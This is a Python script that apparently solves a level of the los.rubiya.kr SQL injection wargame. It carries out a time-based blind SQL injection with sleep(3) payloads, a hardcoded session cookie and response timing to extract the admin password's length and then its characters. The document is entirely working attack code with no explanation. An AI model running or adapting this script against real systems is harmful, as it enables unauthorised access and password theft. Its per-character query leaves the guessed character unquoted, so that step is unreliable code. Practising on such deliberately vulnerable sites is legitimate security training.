import requests
import string 
import time

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?"
cookie = {'PHPSESSID':'aiub2r5p1f79164953a9ofa28v'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw=1' or id=0x61646d696e and length(pw)={} and sleep(3) %23".format(pw_len)
        start = time.time()
        res = requests.get(url=url+query, cookies=cookie)
        end = time.time() - start
        print(query)
        if end > 2.5:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw=1' or id=0x61646d696e and substr(pw,{},1)={} and sleep(3) %23".format(i,j)
            print(query)
            start = time.time()
            res = requests.get(url=url+query, cookies=cookie)
            end = time.time() - start
            if end > 2.5:
                passwd += j
                print("PASSWORD CHAR : " + j)
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
